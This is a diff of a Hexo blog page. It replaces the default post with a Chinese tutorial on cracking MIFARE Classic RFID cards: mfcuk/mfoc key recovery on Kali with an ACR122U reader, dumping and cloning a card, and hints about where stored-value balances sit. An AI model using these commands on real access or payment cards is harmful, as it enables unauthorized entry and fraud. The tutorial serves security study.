@@ -6,17 +6,19 @@
   
   <title>Hello World | Hexo</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-  <meta name="description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+  <meta name="description" content="浅析Mifare1系列RFID卡破解M1卡：MIFARE是恩智浦半导体公司（NXP Semiconductors）拥有的一系列非接触式智能卡和近傍型卡技术的注册商标。MIFARE包括一系列依循ISO&#x2F;IEC 14443-A规格，利用无线射频识别（频率为13.56MHz）的多种非接触式智能卡专有解决方案。这项技术是最早是1994年由米克朗集团（Mikron Group）开发，在1998年转售给飞利浦">
 <meta property="og:type" content="article">
 <meta property="og:title" content="Hello World">
 <meta property="og:url" content="http://example.com/2021/01/05/hello-world/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when using Hexo, you can find the answer in troubleshooting or you can ask me on GitHub. Quick">
+<meta property="og:description" content="浅析Mifare1系列RFID卡破解M1卡：MIFARE是恩智浦半导体公司（NXP Semiconductors）拥有的一系列非接触式智能卡和近傍型卡技术的注册商标。MIFARE包括一系列依循ISO&#x2F;IEC 14443-A规格，利用无线射频识别（频率为13.56MHz）的多种非接触式智能卡专有解决方案。这项技术是最早是1994年由米克朗集团（Mikron Group）开发，在1998年转售给飞利浦">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://downloads.acs.com.hk/images/acr122u_2_1.jpg">
 <meta property="article:published_time" content="2021-01-05T13:25:12.300Z">
-<meta property="article:modified_time" content="2021-01-05T13:25:14.000Z">
+<meta property="article:modified_time" content="2021-01-05T14:18:52.000Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://downloads.acs.com.hk/images/acr122u_2_1.jpg">
   
     <link rel="alternate" href="/atom.xml" title="Hexo" type="application/atom+xml">
   
@@ -95,20 +97,75 @@
     
     <div class="e-content article-entry" itemprop="articleBody">
       
-        <p>Welcome to <a target="_blank" rel="noopener" href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a target="_blank" rel="noopener" href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p>
-<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html">Writing</a></p>
-<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/server.html">Server</a></p>
-<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html">Generating</a></p>
-<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>
-<p>More info: <a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>
+        <h1 id="浅析Mifare1系列RFID卡破解"><a href="#浅析Mifare1系列RFID卡破解" class="headerlink" title="浅析Mifare1系列RFID卡破解"></a>浅析Mifare1系列RFID卡破解</h1><h2 id="M1卡：MIFARE是恩智浦半导体公司（NXP-Semiconductors）拥有的一系列非接触式智能卡和近傍型卡技术的注册商标。"><a href="#M1卡：MIFARE是恩智浦半导体公司（NXP-Semiconductors）拥有的一系列非接触式智能卡和近傍型卡技术的注册商标。" class="headerlink" title="M1卡：MIFARE是恩智浦半导体公司（NXP Semiconductors）拥有的一系列非接触式智能卡和近傍型卡技术的注册商标。"></a>M1卡：<strong>MIFARE</strong>是<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E6%81%A9%E6%99%BA%E6%B5%A6%E5%8D%8A%E5%AF%BC%E4%BD%93">恩智浦半导体公司</a>（NXP Semiconductors）拥有的一系列<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%9D%9E%E6%8E%A5%E8%A7%A6%E5%BC%8F%E6%99%BA%E8%83%BD%E5%8D%A1">非接触式智能卡</a>和<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E8%BF%91%E5%82%8D%E5%9E%8B%E5%8D%A1">近傍型卡</a>技术的注册商标。</h2><p>MIFARE包括一系列依循<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/ISO/IEC_14443">ISO/IEC 14443</a>-A规格，利用<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E7%84%A1%E7%B7%9A%E5%B0%84%E9%A0%BB%E8%AD%98%E5%88%A5">无线射频识别</a>（频率为13.56<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/MHz">MHz</a>）的多种非接触式智能卡专有解决方案。这项技术是最早是1994年由<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/w/index.php?title=%E7%B1%B3%E5%85%8B%E6%9C%97&action=edit&redlink=1">米克朗</a>集团（Mikron Group）开发，在1998年转售给<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/%E9%A3%9B%E5%88%A9%E6%B5%A6">飞利浦电子公司</a>（2006年更名为恩智浦半导体公司）。近年来MIFARE已经普遍在日常生活当中使用，如大众运输系统付费、商店小额消费、门禁安全系统、借书证等。他们<strong>专有的加密算法</strong>（CRYPTO-1）已经被<strong>反向工程</strong>，并在十年前被研究人员打破。 。</p>
+<h2 id="硬件架构及工作原理"><a href="#硬件架构及工作原理" class="headerlink" title="硬件架构及工作原理"></a>硬件架构及工作原理</h2><table>
+<thead>
+<tr>
+<th>区段</th>
+<th>区块 0</th>
+<th>区块 1</th>
+<th>区块 2</th>
+<th>区块 3</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>0</td>
+<td>制造商代码</td>
+<td>资料区</td>
+<td>资料区</td>
+<td>密钥、访问权限</td>
+</tr>
+<tr>
+<td>1</td>
+<td>资料区</td>
+<td>资料区</td>
+<td>资料区</td>
+<td>密钥、访问权限</td>
+</tr>
+<tr>
+<td>:</td>
+<td>:</td>
+<td>:</td>
+<td>:</td>
+<td>:</td>
+</tr>
+<tr>
+<td>14</td>
+<td>资料区</td>
+<td>资料区</td>
+<td>资料区</td>
+<td>密钥、访问权限</td>
+</tr>
+<tr>
+<td>15</td>
+<td>资料区</td>
+<td>资料区</td>
+<td>资料区</td>
+<td>密钥、访问权限</td>
+</tr>
+</tbody></table>
+<p>来源：<a target="_blank" rel="noopener" href="https://zh.wikipedia.org/wiki/MIFARE#%E6%94%BB%E6%93%8A%E4%BA%8B%E4%BB%B6">维基百科</a></p>
+<h2 id="破解过程"><a href="#破解过程" class="headerlink" title="破解过程"></a>破解过程</h2><h3 id="01-读出数据"><a href="#01-读出数据" class="headerlink" title="01.读出数据"></a>01.读出数据</h3><p><img src="https://downloads.acs.com.hk/images/acr122u_2_1.jpg" alt="STD019_ACR122"></p>
+<p>本次使用acr122u在13.56 MHz频段上读取，软件使用基于Linux kali的mfcuk</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">root @ kali：〜＃mfcuk -h</span><br><span class="line">mfcuk-0.3.8</span><br><span class="line">Mifare Classic DarkSide密钥恢复工具-0.3</span><br><span class="line">by Andrei Costin，zveriu@gmail.com，http</span><br><span class="line"></span><br><span class="line">: &#x2F;&#x2F;andreicostin.com用法：</span><br><span class="line">-C-要求与阅读器进行显式连接。如果没有此选项，则不会建立连接，也不会进行恢复</span><br><span class="line">-i mifare.dmp-装入输入mifare_classic_tag类型转储</span><br><span class="line">-I mifare_ext.dmp-装入此工具特定的扩展输入转储，在mifare_classic_tag类型转储之上还有多个字段</span><br><span class="line">-o mifare.dmp-将生成的mifare_classic_tag转储输出到给定文件</span><br><span class="line">-O mifare_ext.dmp-将生成的扩展转储输出到给定文件</span><br><span class="line">-V扇区[：A &#x2F; B &#x2F; any_other_alphanum [：fullkey]]-验证指定的密钥部门，-1表示所有部门</span><br><span class="line">    在指定了第一个分号密钥类型之后：A仅验证密钥A，B仅验证密钥B，其他所有内容验证两个密钥</span><br><span class="line">    在指定了第二个分号完整的12个十六进制数字密钥之后-该密钥将覆盖给定扇区的任何已加载的转储密钥）和密钥类型</span><br><span class="line">-R扇区[：A &#x2F; B &#x2F; any_other_alphanum]-恢复扇区的密钥，-1表示所有扇区。</span><br><span class="line">    在指定了第一个分号键类型之后：A仅恢复keyA，B仅恢复keyB，其他任何东西都恢复两个键</span><br><span class="line">-U UID-强制特定的UID。如果使用-i加载了转储，则-U将覆盖加载了转储的内存中的</span><br><span class="line">-M标签类型-强制特定标签类型。8是1K，24是4K，32是DESFire</span><br><span class="line">-D-对于标记为要验证的扇区和密钥类型，首先使用默认密钥进行验证（也许您很幸运）</span><br><span class="line">-d key-指定要检查的其他完整的12进制数字默认密钥。多个-d选项可用于更多其他键</span><br><span class="line">-s-SLEEP_AT_FIELD_OFF休眠的毫秒数（默认值：10 ms）</span><br><span class="line">-S-SLEEP_AFTER_FIELD_ON休眠的毫秒数（默认值：50 ms）</span><br><span class="line">-P hex_literals_separated-尝试从a中恢复密钥Proxmark3（基于mifarecrack.c）嗅到的会话。接受几个选项：</span><br><span class="line">    以uid：tag_chal：nr_enc：reader_resp：tag_resp形式的十六进制文字格式的串联字符串</span><br><span class="line">    示例-P 0x5c72325e：0x50829cd6：0xb8671f76：0xe00eefc9：0x4888964f将找到关键字FFFFFFFFFFFF</span><br><span class="line">-p proxmark3_full.log-尝试自行分析日志文件（基于mifarecrack.py），获取选项-P的值并调用它-F-</span><br><span class="line">尝试根据已知卡的数据对输入转储（-i）进行指纹识别格式</span><br><span class="line">-v verbose_level-详细级别（默认为O）</span><br><span class="line"></span><br><span class="line">使用示例：</span><br><span class="line">  恢复所有扇区中的所有密钥：</span><br><span class="line">    mfcuk -C -R -1</span><br><span class="line">  以250 ms的时间恢复所有延迟的扇区＃0密钥（延迟可能会提供更多结果）：</span><br><span class="line">    mfcuk -C -R 0 -s 250 -S 250</span><br></pre></td></tr></table></figure>
+<p>这是kali提供的实例</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mfcuk -C -R 0：A</span><br></pre></td></tr></table></figure>
+<p>检索a密钥</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&gt; mfoc -O source_dump.mfd -k &#123;the key A you retrieved&#125;</span><br><span class="line">The custom key 0xFFFFFFFFFFFF has been added to the default keys</span><br><span class="line">Found Mifare Classic 1k tag</span><br><span class="line">ISO&#x2F;IEC 14443A (106 kbps) target:</span><br><span class="line">    ATQA (SENS_RES): 00  04  </span><br><span class="line">* UID size: single</span><br><span class="line">* bit frame anticollision supported</span><br><span class="line">       UID (NFCID1): ff ff ff ff </span><br><span class="line">      SAK (SEL_RES): 08  </span><br><span class="line">* Not compliant with ISO&#x2F;IEC 14443-4</span><br><span class="line">* Not compliant with ISO&#x2F;IEC 18092</span><br><span class="line">Fingerprinting based on MIFARE type Identification Procedure:</span><br><span class="line">* MIFARE Classic 1K</span><br><span class="line">* MIFARE Plus (4 Byte UID or 4 Byte RID) 2K, Security level 1</span><br><span class="line">* SmartMX with MIFARE 1K emulation</span><br><span class="line">Other possible matches based on ATQA &amp; SAK values:</span><br><span class="line">Try to authenticate to all sectors with default keys...</span><br><span class="line">Symbols: &#39;.&#39; no key found, &#39;&#x2F;&#39; A key found, &#39;\&#39; B key found, &#39;x&#39; both keys found</span><br><span class="line">[Key: FFFFFFFFFFFF] -&gt; [xxxxxxxxxxxxxxxx]</span><br><span class="line">Sector 00 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 01 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 02 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 03 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 04 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 05 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 06 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 07 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 08 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 09 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 10 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 11 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 12 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 13 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 14 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br><span class="line">Sector 15 - Found   Key A: FFFFFFFFFFFF Found   Key B: FFFFFFFFFFFF</span><br></pre></td></tr></table></figure>
+<p>这里应该要安装一下mfoc，但kali也有预装</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexdump -C source_dump.mfd</span><br></pre></td></tr></table></figure>
+<p>使用十六进制格式查看已经转储的文件</p>
+<h3 id="02-转储数据写卡"><a href="#02-转储数据写卡" class="headerlink" title="02.转储数据写卡"></a>02.转储数据写卡</h3><p>改写之前的卡</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">mfoc -O dest.mfd </span><br><span class="line">mfoc -O dest.mfd -k &#123;the A key&#125; </span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">nfc-mfclassic w a dest.mfd source_dump.mfd</span><br><span class="line">NFC reader: ACS &#x2F; ACR122U PICC Interface opened</span><br><span class="line">Found MIFARE Classic card:</span><br><span class="line">ISO&#x2F;IEC 14443A (106 kbps) target:</span><br><span class="line">    ATQA (SENS_RES): 00  04  </span><br><span class="line">       UID (NFCID1): 73  98  96  d5  </span><br><span class="line">      SAK (SEL_RES): 08  </span><br><span class="line">Guessing size: seems to be a 1024-byte card</span><br><span class="line">Writing 64 blocks |x</span><br></pre></td></tr></table></figure>
+<p>即可转储至新RFID卡中。</p>
+<h3 id="03-数据分析"><a href="#03-数据分析" class="headerlink" title="03.数据分析"></a>03.数据分析</h3><p>离线小额支付（水卡等）的金额位一般是十进制对应的16进制数倒位，或对应的二进制数去补码再转化为16进制。基本前后对照都能看出。各个厂商的方式不同，并且有关支付的破解操作有法律风险，故不再深入破解。</p>
+<h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>​        acr122u与kali mfcuk的组合。基本可以实现市面上大多数半加密卡和部分全加密卡的密钥破解，数据读取和复制。而对于部分不在0扇区存储密钥的全加密卡，则需要通过Proxmark3等嗅探得到数据。<a target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html">https://hexo.io/docs/one-command-deployment.html</a>)</p>
 
       
     </div>
     <footer class="article-footer">
-      <a data-url="http://example.com/2021/01/05/hello-world/" data-id="ckjk2ppux00004skfh9y23ln0" data-title="Hello World" class="article-share-link">Share</a>
+      <a data-url="http://example.com/2021/01/05/hello-world/" data-id="ckjk2x9la0000v4kf4snc740k" data-title="Hello World" class="article-share-link">Share</a>
       
       
       
